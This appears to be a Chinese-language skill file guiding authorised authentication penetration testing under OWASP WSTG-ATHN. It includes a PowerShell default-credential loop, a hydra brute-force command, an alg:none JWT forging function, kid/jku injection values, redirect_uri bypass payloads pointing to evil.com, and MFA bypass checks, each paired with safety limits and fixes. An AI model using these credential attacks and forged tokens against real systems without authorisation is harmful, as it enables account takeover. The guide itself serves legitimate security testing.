---
name: authentication
description: 身份认证测试阶段详细指南 (WSTG-ATHN) - 弱口令、凭据找回、JWT、OAuth/OIDC、MFA 绕过
---

# Phase 3: 身份认证测试 (WSTG-ATHN)

黑盒只观察认证流程；涉及登录的测试需测试账号（灰盒）。所有涉及登录的测试必须限速，避免触发账户锁定造成拒绝服务。

## 测试目标

1. 检测弱口令与暴力破解防护缺失
2. 检测凭据传输、找回流程缺陷
3. 检测 JWT 实现缺陷（算法混淆、claim 篡改、kid/jku 注入）
4. 检测 OAuth/OIDC 流程缺陷（state CSRF、redirect_uri 绕过、授权码泄漏）
5. 检测 MFA 绕过

## 安全约束

- 暴力破解限速：单账号每分钟 ≤ 10 次，总尝试 ≤ 50 次/账号
- 只用专用测试账号，禁止共享生产账号
- 禁止对锁定机制本身做 DoS（不写无限重试循环）

---

## 3.1 弱口令与暴力破解

### 检查点

- [ ] 默认凭据（admin/admin、test/test）
- [ ] 无账户锁定 / 无验证码 / 无限速
- [ ] 登录失败响应是否可枚举用户名（响应体/耗时差异）

### 手工测试

```powershell
# 常见弱口令（先只试少量，确认无锁定再决定是否继续）
$creds = @(
    @{ user = "admin"; pass = "admin" },
    @{ user = "admin"; pass = "123456" },
    @{ user = "admin"; pass = "password" },
    @{ user = "test";  pass = "test" }
)

foreach ($c in $creds) {
    $body = @{ username = $c.user; password = $c.pass }
    try {
        $resp = Invoke-WebRequest -Uri "$TARGET_URL/login" -Method Post -Body $body -UseBasicParsing -ErrorAction Stop
        if ($resp.Content -notmatch "错误|失败|invalid|incorrect") {
            Write-Host "[!] 弱口令可能有效: $($c.user)/$($c.pass)"
        }
    } catch { }
    Start-Sleep -Milliseconds 600  # 限速
}
```

确认无锁定后，用 hydra 做有限字典测试（`-f` 命中即停，线程限 4）：

```powershell
wsl -e hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f "TARGET_DOMAIN" http-post-form "/login:username=^USER^&password=^PASS^:登录失败"
```

### 判定标准

连续 5 次失败后仍无限速/锁定/验证码 → 中危；默认凭据成功 → 严重。

### 修复建议

账户锁定（失败 N 次锁定 M 分钟）+ 验证码 + 登录限速；禁止默认凭据，首次登录强制改密。

---

## 3.2 凭据传输与找回

### 检查点

- [ ] 登录/注册/找回全程 HTTPS（无明文降级）
- [ ] 密码找回 token：可预测/不过期/可枚举/不绑会话/使用后不失效
- [ ] Remember Me token 是否可撤销、是否与密码绑定
- [ ] 注册/找回响应是否泄漏"用户是否存在"（用户枚举）

### 判定标准

找回 token 规律可构造、不过期或复用有效 → 高危；用户枚举 → 低危。

### 修复建议

找回 token 一次性、时效 ≤15 分钟、绑定用户+会话；Remember Me 支持服务端吊销。

---

## 3.3 JWT 测试

### 测试原理

JWT 由 `header.payload.signature` 三段 base64url 组成，常见缺陷集中在签名校验环节。

### 解码与重签名

```powershell
function ConvertFrom-B64Url([string]$b) {
    $b = $b.Replace('-', '+').Replace('_', '/')
    switch ($b.Length % 4) { 2 { $b += "==" } 3 { $b += "=" } }
    [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b))
}

$token = "HEADER.PAYLOAD.SIGNATURE"
$h, $p, $s = $token.Split(".")
ConvertFrom-B64Url $h
ConvertFrom-B64Url $p
```

| 测试项 | 方法 | 判定 |
|---|---|---|
| `alg:none` | header 改 `{"alg":"none"}`，删 signature | 服务端接受 → 严重 |
| HS/RS 混淆 | 用 RS256 公钥当 HMAC 密钥重新签名 | 服务端接受 → 严重 |
| `kid` 注入 | `kid` 改为 `../../dev/null` 或 SQL 片段 | 行为异常/报 SQL 错 → 记录 |
| `jku`/`x5u` 注入 | 改成自签 HTTPS URL | 服务端去拉取 → 严重 |
| claim 篡改 | `role:user` 改为 `role:admin` | 仍通过 → 严重 |
| 过期不校验 | `exp` 改为过去时间 | 仍可用 → 高危 |
| 弱密钥 | hashcat `-m 16500` 爆破 HS256 密钥 | 爆出 → 严重 |

```powershell
# alg:none PoC（仅验证服务端行为，不落地）
function New-JwtNone([string]$payloadJson) {
    $b64 = { param($s) [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s)).TrimEnd('=').Replace('+', '-').Replace('/', '_') }
    $header = & $b64 '{"alg":"none","typ":"JWT"}'
    $payload = & $b64 $payloadJson
    "$header.$payload."
}

$forged = New-JwtNone '{"sub":"1","role":"admin","exp":9999999999}'
# 用法：Authorization: Bearer $forged 请求敏感接口，观察是否获得越权响应
```

### 修复建议

服务端固定算法白名单，显式拒绝 `none`；RS\* 与 HS\* 密钥隔离；校验 `exp/iat/nbf/iss/aud`；敏感 claim 不依赖客户端可读 payload。

---

## 3.4 OAuth / OIDC 测试

### 检查点

- [ ] `state`：缺失、固定值、可预测 → 登录 CSRF
- [ ] `redirect_uri` 白名单可绕过（开放重导、userinfo 混淆、路径穿越、子域）
- [ ] 授权码是否泄漏在 Referer / URL fragment / 日志
- [ ] public client 是否强制 PKCE；授权码一次性 + 短时效
- [ ] scope 是否服务端二次校验（提升风险）
- [ ] implicit 模式是否仍在使用（token 直接暴露在 URL）

### Payload 示例

```text
# redirect_uri 绕过尝试（以 app.example.com 为白名单域）
redirect_uri=https://app.example.com.evil.com/cb      # 后缀附加
redirect_uri=https://app.example.com@evil.com/cb      # userinfo 混淆
redirect_uri=https://app.example.com/callback/../x    # 路径穿越
redirect_uri=https://app.example.com.evil.com         # 子域接管
redirect_uri=https://evil.com/app.example.com         # 前缀附加

# state CSRF：删掉 state 或复用旧 state 完成授权，观察是否仍能登录
```

### 判定标准

任一绕过导致 code/token 发往外部域 → 严重；state 缺失 → 高危。

### 修复建议

redirect_uri 精确全串匹配白名单；state 一次性随机且绑会话；code 一次性 + 60 秒过期；public client 强制 PKCE；下线 implicit 模式。

---

## 3.5 MFA 绕过

### 检查点

- [ ] 响应篡改：登录接口返回 `mfa_required:true` 时改为 false
- [ ] 流程跳过：不输 MFA 直接访问登录后页面/接口
- [ ] 备用恢复码：可暴力破解、可复用
- [ ] MFA 验证码可重放、不绑会话、无过期
- [ ] 密码正确 + MFA 错误时的响应差异（信息泄漏）

### 判定标准

任一非 MFA 路径可进入登录态 → 严重；验证码可重放 → 高危。

### 修复建议

服务端强制 MFA 状态机（不依赖客户端步骤）；验证码一次性 + 5 分钟过期 + 绑会话；恢复码限次 + 使用即失效。

## 误报说明

- 企业 SSO 环境下部分流程由 IdP 完成，本端看不到不代表没测（改测 IdP）
- 登录接口 429/403 拦截可能来自 WAF/网关而非业务限速，看响应特征区分

## 输出格式

| 漏洞类型 | 位置 | 参数 | Payload | 证据 | 风险 | 修复建议 |
